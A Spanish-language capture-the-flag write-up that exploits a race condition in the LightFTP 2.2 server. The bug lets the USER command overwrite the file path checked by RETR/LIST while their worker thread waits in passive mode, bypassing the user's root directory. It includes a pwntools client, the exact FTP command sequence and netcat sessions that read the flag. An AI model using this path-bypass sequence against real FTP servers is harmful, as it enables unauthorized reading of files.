El reto nos da tres archivos.

```
-rw-r--r-- 1 elias elias   806 Jan  3 14:14 Dockerfile
-rwxr-xr-x 1 elias elias 73048 Jan  3 13:25 fftp*
-rw-r--r-- 1 elias elias   200 Jan  5 12:38 fftp.conf
```

Revisando el Dockerfile podemos observar que descarga el código fuente y compila el binario de fftp. También observamos que el nombre de la flag contiene un UUID.

```Dockerfile
FROM ubuntu:22.04

ENV DEBIAN_FRONTEND noninteractive

RUN apt-get update &&\
    apt-get install -y --no-install-recommends wget unzip gcc make libc6-dev gnutls-dev uuid

RUN mkdir -p /server/data/ &&\
    echo "hello from LightFTP" >> /server/data/hello.txt &&\
    cd /server &&\
    wget --no-check-certificate https://codeload.github.com/hfiref0x/LightFTP/zip/refs/tags/v2.2 -O LightFTP-2.2.zip &&\
    unzip LightFTP-2.2.zip &&\
    cd LightFTP-2.2/Source/Release &&\
    make &&\
    cp -a ./fftp /server/ &&\
    cd /server &&\
    rm -rf LightFTP-2.2 LightFTP-2.2.zip

COPY ./flag /flag
COPY ./fftp.conf /server/fftp.conf

RUN mv /flag /flag.`uuid` &&\
    useradd -M -d /server/ -U ftp

WORKDIR /server

EXPOSE 2121

CMD ["runuser", "-u", "ftp", "-g", "ftp", "/server/fftp", "/server/fftp.conf"]
```

El archivo fftp.conf contiene configuraciones del servidor ftp y de usuarios. En este caso el usuario es "anonymous" y cualquier password funciona para loguearse.  El usuario tiene permisos de solo lectura y su raíz es /server/data

```toml
[ftpconfig]
port=2121
maxusers=10000000
interface=0.0.0.0
local_mask=255.255.255.255

minport=30000
maxport=60000

goodbyemsg=Goodbye!
keepalive=1

[anonymous]
pswd=*
accs=readonly
root=/server/data/
```

Decidí empezar revisando el código fuente debido a que no conocía mucho sobre ftp. Después de revisar el código entendí el objetivo del reto. La flag estaba guardada en /, pero nuestro usuario está restringido a /server/data, por lo que no podemos acceder al archivo con la flag.

Busqué en el código un comando que me permitiera leer un archivo del servidor. En el archivo ftpserv.c  hay un arreglo con todos los comandos disponibles.

```c
static const FTPROUTINE_ENTRY ftpprocs[MAX_CMDS] = {
        {"USER", ftpUSER}, {"QUIT", ftpQUIT}, {"NOOP", ftpNOOP}, {"PWD",  ftpPWD },
        {"TYPE", ftpTYPE}, {"PORT", ftpPORT}, {"LIST", ftpLIST}, {"CDUP", ftpCDUP},
        {"CWD",  ftpCWD }, {"RETR", ftpRETR}, {"ABOR", ftpABOR}, {"DELE", ftpDELE},
        {"PASV", ftpPASV}, {"PASS", ftpPASS}, {"REST", ftpREST}, {"SIZE", ftpSIZE},
        {"MKD",  ftpMKD }, {"RMD",  ftpRMD }, {"STOR", ftpSTOR}, {"SYST", ftpSYST},
        {"FEAT", ftpFEAT}, {"APPE", ftpAPPE}, {"RNFR", ftpRNFR}, {"RNTO", ftpRNTO},
        {"OPTS", ftpOPTS}, {"MLSD", ftpMLSD}, {"AUTH", ftpAUTH}, {"PBSZ", ftpPBSZ},
        {"PROT", ftpPROT}, {"EPSV", ftpEPSV}, {"HELP", ftpHELP}, {"SITE", ftpSITE}
};
```

Revisando en https://en.wikipedia.org/wiki/List_of_FTP_commands encontré que el comando RETR era lo que necesitaba.

Revisando el código para el comando RETR, se puede ver que el nombre del archivo es sanitizado, por lo que no es posible utilizar algo como RETR ../../flag.{uuid}. También se observa que el comando requiere estar logueado.

```c
int ftpRETR(PFTPCONTEXT context, const char *params)
{
    struct      stat    filestats;
    pthread_t           tid;

    if (context->Access == FTP_ACCESS_NOT_LOGGED_IN)
        return sendstring(context, error530);
    if (context->WorkerThreadValid == 0)
        return sendstring(context, error550_t);
    if ( params == NULL )
        return sendstring(context, error501);

    if ( context->File != -1 ) {
        close(context->File);
        context->File = -1;
    }

    ftp_effective_path(context->RootDir, context->CurrentDir, params, sizeof(context->FileName), context->FileName); # Sanitizacion aqui
```

La función ftp_effective_path se asegura de que cualquier path ingresado por el usuario esté dentro del root del usuario (en este caso /server/data), por lo que la flag es inaccesible usando este comando a primera vista. El path sanitizado es almacenado en context->FileName. En la variable context se guarda información sobre el servidor y el socket del cliente. El root del cliente es almacenado en context->RootDir, por lo que mi primera idea fue buscar un overflow para cambiar el RootDir por / y obtener acceso a la flag.

```c
typedef struct _FTPCONTEXT {
    pthread_mutex_t     MTLock;
    SOCKET              ControlSocket;
    SOCKET              DataSocket;
    pthread_t           WorkerThreadId;
    /*
     * WorkerThreadValid is output of pthread_create
     * therefore zero is VALID indicator and -1 is invalid.
     */
    int                 WorkerThreadValid;
    int                 WorkerThreadAbort;
    in_addr_t           ServerIPv4;
    in_addr_t           ClientIPv4;
    in_addr_t           DataIPv4;
      in_port_t           DataPort;
    int                 File;
    int                 Mode;
    int                 Access;
    int                 SessionID;
    int                 DataProtectionLevel;
    off_t               RestPoint;
    uint64_t            BlockSize;
    char                CurrentDir[PATH_MAX];
    char                RootDir[PATH_MAX];
    char                RnFrom[PATH_MAX];
    char                FileName[2*PATH_MAX];
    gnutls_session_t    TLS_session;
    SESSION_STATS       Stats;
} FTPCONTEXT, *PFTPCONTEXT;
```

Sin embargo no encontré una parte del código que pudiera tener overflow, en todo el código se utiliza snprintf para evitar overflow, por lo que lo siguiente que intenté fue buscar un flujo de ejecución en el que pudiera leer un archivo evitando la sanitización. Esta idea vino debido a que en todo el código se reutilizan buffers para guardar información que no deberían, como en el comando USER.

```c
int ftpUSER(PFTPCONTEXT context, const char *params)
{
    if ( params == NULL )
        return sendstring(context, error501);

    context->Access = FTP_ACCESS_NOT_LOGGED_IN; # Ya no estamos logueados

    writelogentry(context, " USER: ", (char *)params);
    snprintf(context->FileName, sizeof(context->FileName), "331 User %s OK. Password required\r\n", params);
    sendstring(context, context->FileName);

    /* Save login name to FileName for the next PASS command */
    strcpy(context->FileName, params); # Nombre de usuario copiado
    return 1;
}
```

Aquí se observa que el nombre de usuario es copiado a context->FileName. Esto me llamó la atención ya que algo como USER /flag.{uuid} guardaría en context->FileName la ruta de la flag y de esta forma leerla, pero a primera vista hay 2 problemas. El primero es que al inicio de la función revoca el estatus de login, y el comando RETR requiere el login. El segundo problema es que el comando RETR también borraría lo que tenemos guardado en context->FileName, ya que primero establece ese valor y luego lee el archivo.

Finalmente pensé en una posible race condition. El código completo de la función ejecutada por el comando RETR.

```c
int ftpRETR(PFTPCONTEXT context, const char *params)
{
    struct      stat    filestats;
    pthread_t           tid;

    if (context->Access == FTP_ACCESS_NOT_LOGGED_IN)
        return sendstring(context, error530);
    if (context->WorkerThreadValid == 0)
        return sendstring(context, error550_t);
    if ( params == NULL )
        return sendstring(context, error501);

    if ( context->File != -1 ) {
        close(context->File);
        context->File = -1;
    }

    ftp_effective_path(context->RootDir, context->CurrentDir, params, sizeof(context->FileName), context->FileName);
    while (stat(context->FileName, &filestats) == 0)
    {
        if ( S_ISDIR(filestats.st_mode) )
            break;

        sendstring(context, interm150);
        writelogentry(context, " RETR: ", (char *)params);
        context->WorkerThreadAbort = 0;

        pthread_mutex_lock(&context->MTLock);

        context->WorkerThreadValid = pthread_create(&tid, NULL, (void * (*)(void *))retr_thread, context); # Hilo
        if ( context->WorkerThreadValid == 0 )
            context->WorkerThreadId = tid;
        else
            sendstring(context, error451);

        pthread_mutex_unlock(&context->MTLock);

        return 1;
    }

    return sendstring(context, error550);
}
```

Observamos que en esta función verifica que el usuario tenga login y que el archivo que ingresó exista en el sistema. Una vez que pasó esas 2 verificaciones levanta un hilo que se encarga de leer el archivo y enviar los contenidos al cliente. El código del hilo.

```c
void *retr_thread(PFTPCONTEXT context)
{
    volatile SOCKET             clientsocket;
    int                                 sent_ok, f;
    off_t                               offset;
    ssize_t                             sz, sz_total;
    size_t                              buffer_size;
    char                                *buffer;
    struct timespec             t;
    signed long long    lt0, lt1, dtx;
    gnutls_session_t    TLS_datasession;

    pthread_mutex_lock(&context->MTLock);
    pthread_cleanup_push(cleanup_handler, context);

    f = -1;
    sent_ok = 0;
    sz_total = 0;
    buffer = NULL;
    TLS_datasession = NULL;
    clientsocket = INVALID_SOCKET;
    clock_gettime(CLOCK_MONOTONIC, &t);
    lt0 = t.tv_sec*1e9 + t.tv_nsec;
    dtx = t.tv_sec+30;

    buffer = malloc(TRANSMIT_BUFFER_SIZE);
    while (buffer != NULL)
    {
        clientsocket = create_datasocket(context);
        if (clientsocket == INVALID_SOCKET)
            break;
            
                 if (context->TLS_session != NULL)
        {
            if (!ftp_init_tls_session(&TLS_datasession, clientsocket, 0))
                break;

            buffer_size = gnutls_record_get_max_size(TLS_datasession);
            if (buffer_size > TRANSMIT_BUFFER_SIZE)
                buffer_size = TRANSMIT_BUFFER_SIZE;
        }
        else
            buffer_size = TRANSMIT_BUFFER_SIZE;

        f = open(context->FileName, O_RDONLY); # Abre el archivo
```

Observamos que el hilo realiza algunas operaciones y despues intenta abrir el archivo con el nombre contenido en context->FileName, por lo que es posible utilizar RETR para leer un archivo que sabemos que existe en el servidor (en este caso en el Dockerfile vemos que existe el archivo hello.txt) y después utilizar el comando USER para guardar en context->FileName la ruta de la flag. El único problema restante es que no conocemos el nombre de la flag, pero el comando LIST también funciona con un hilo, por lo que podemos aplicar la misma lógica. El código de LIST.

```c
int ftpLIST(PFTPCONTEXT context, const char *params)
{
    struct      stat    filestats;
    pthread_t           tid;

    if (context->Access == FTP_ACCESS_NOT_LOGGED_IN)
        return sendstring(context, error530);
    if (context->WorkerThreadValid == 0)
        return sendstring(context, error550_t);

    if (params != NULL)
    {
        if ((strcmp(params, "-a") == 0) || (strcmp(params, "-l") == 0))
            params = NULL;
    }

    ftp_effective_path(context->RootDir, context->CurrentDir, params, sizeof(context->FileName), context->FileName);

    while (stat(context->FileName, &filestats) == 0)
    {
        if ( !S_ISDIR(filestats.st_mode) )
            break;

        sendstring(context, interm150);
        writelogentry(context, " LIST", (char *)params);
        context->WorkerThreadAbort = 0;

        pthread_mutex_lock(&context->MTLock);

        context->WorkerThreadValid = pthread_create(&tid, NULL, (void * (*)(void *))list_thread, context); # Hilo
```

Código del hilo de LIST.

```c
void *list_thread(PFTPCONTEXT context)
{
    volatile SOCKET     clientsocket;
    gnutls_session_t    TLS_datasession;
    int                                 ret;
    DIR                                 *pdir;
    struct dirent               *entry;
    
    pthread_mutex_lock(&context->MTLock);
    pthread_cleanup_push(cleanup_handler, context);
    ret = 0;
    TLS_datasession = NULL;

    clientsocket = create_datasocket(context); # socket aqui
    while (clientsocket != INVALID_SOCKET)
    {
        if (context->TLS_session != NULL)
            if (!ftp_init_tls_session(&TLS_datasession, clientsocket, 0))
                break;

        pdir = opendir(context->FileName); # Abre el directorio almacenado en context->FileName
```

Por último, para hacer el exploit más sencillo observamos la función create_datasocket que es utilizada en ambos hilos antes de abrir el archivo.

```c
SOCKET create_datasocket(PFTPCONTEXT context)
{
    SOCKET                              clientsocket = INVALID_SOCKET;
    struct sockaddr_in  laddr;
    socklen_t                   asz;

    memset(&laddr, 0, sizeof(laddr));

    switch ( context->Mode ) {
    case MODE_NORMAL:
        clientsocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        context->DataSocket = clientsocket;
        if ( clientsocket == INVALID_SOCKET )
            return INVALID_SOCKET;

        laddr.sin_family = AF_INET;
        laddr.sin_port = context->DataPort;
        laddr.sin_addr.s_addr = context->DataIPv4;
        if ( connect(clientsocket, (const struct sockaddr *)&laddr, sizeof(laddr)) == -1 ) {
            close(clientsocket);
            return INVALID_SOCKET;
        }
        break;

    case MODE_PASSIVE:
        asz = sizeof(laddr);
        clientsocket = accept(context->DataSocket, (struct sockaddr *)&laddr, &asz);
        close(context->DataSocket);
        context->DataSocket = clientsocket;

        if ( clientsocket == INVALID_SOCKET )
            return INVALID_SOCKET;

        context->DataIPv4 = 0;
        context->DataPort = 0;
        context->Mode = MODE_NORMAL;
        break;

    default:
        return INVALID_SOCKET;
    }
    return clientsocket;
}
```

Observamos que si estamos en MODE_PASSIVE, el socket va a esperar por una conexión. Esto nos permite tener detenido el hilo y mientras está detenido usar el comando USER para cambiar el valor de context->FileName. Para obtener MODE_PASSIVE solo necesitamos usar el comando PASV.

Con esto es suficiente para poder leer el archvo de la flag. Un último detalle es que el servidor espera comandos que terminen con \r\n, por lo que hice un script para concatenar esos caracteres antes de enviarlos al servidor.

```python
from pwn import *

p = remote("47.89.253.219", 2121)

print(p.clean(timeout=4).replace(b"\r", b"").decode('utf-8'))

while True:
    cmd = input().strip()
    cmd += "\r\n"
    cmd = cmd.encode('utf-8')

    p.send(cmd)
    output = p.clean(timeout=4).strip().replace(b"\r", b"").decode('utf-8')
    print(output)
```

Finalmente obtenemos la flag:

```
220 LightFTP server ready
USER anonymous
331 User anonymous OK. Password required
PASS a
230 User logged in, proceed.
PASV
227 Entering Passive Mode (0,0,0,0,125,180).
LIST
150 File status okay; about to open data connection.
USER /
331 User / OK. Password required
```

Al entrar en modo pasivo el servidor nos da la ip y puerto (0,0,0,0,125,180) del socket que levantó y que usaremos para obtener la salida del comando LIST y RETR. Esta separada en 2 bytes, solo necesitamos unirla.

```python
❯ python3
Python 3.11.1 (main, Dec 11 2022, 15:18:51) [GCC 10.2.1 20201203] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(125)
'0x7d'
>>> hex(180)
'0xb4'
>>> 0x7db4
32180
```

Ahora para obtener la salida del comando, usando otra terminal con netcat nos conectamos al socket

```
❯ nc 47.89.253.219 32180
drwxr-xr-x  2 0 0 4096 Nov 30 02:04 opt
drwxr-xr-x  5 0 0 340 Jan 08 14:25 dev
drwxr-xr-x  2 0 0 4096 Apr 18 2022 home
drwxr-xr-x  1 0 0 4096 Nov 30 02:07 var
lrwxrwxrwx  1 0 0 9 Nov 30 02:04 lib64
drwxr-xr-x  5 0 0 4096 Nov 30 02:07 run
drwxr-xr-x  2 0 0 4096 Nov 30 02:04 mnt
drwx------  1 0 0 4096 Jan 03 05:25 root
drwxr-xr-x  1 0 0 4096 Nov 30 02:04 usr
lrwxrwxrwx  1 0 0 7 Nov 30 02:04 bin
dr-xr-xr-x  13 0 0 0 Jan 03 12:45 sys
drwxr-xr-x  2 0 0 4096 Apr 18 2022 boot
lrwxrwxrwx  1 0 0 8 Nov 30 02:04 sbin
drwxr-xr-x  2 0 0 4096 Nov 30 02:04 srv
drwxr-xr-x  1 0 0 4096 Jan 08 14:25 etc
lrwxrwxrwx  1 0 0 9 Nov 30 02:04 lib32
lrwxrwxrwx  1 0 0 10 Nov 30 02:04 libx32
drwxr-xr-x  2 0 0 4096 Nov 30 02:04 media
drwxrwxrwt  2 0 0 4096 Nov 30 02:07 tmp
dr-xr-xr-x  172 0 0 0 Jan 08 14:25 proc
lrwxrwxrwx  1 0 0 7 Nov 30 02:04 lib
-rwxr-xr-x  1 0 0 0 Jan 08 14:25 .dockerenv
-rw-r--r--  1 0 0 48 Jan 03 05:28 flag.deb10154-8cb2-11ed-be49-0242ac110002
drwxr-xr-x  1 0 0 4096 Jan 05 04:38 server
```

Y ahora solo resta leer la flag

```
USER anonymous
331 User anonymous OK. Password required
PASS a
230 User logged in, proceed.
PASV
227 Entering Passive Mode (0,0,0,0,172,82).
RETR hello.txt
150 File status okay; about to open data connection.
USER /flag.deb10154-8cb2-11ed-be49-0242ac110002
331 User /flag.deb10154-8cb2-11ed-be49-0242ac110002 OK. Password required
```

```
❯ nc 47.89.253.219 44114
rwctf{race-c0nd1tion-1s-real1y_ha4d_pr0blem!!!}
```
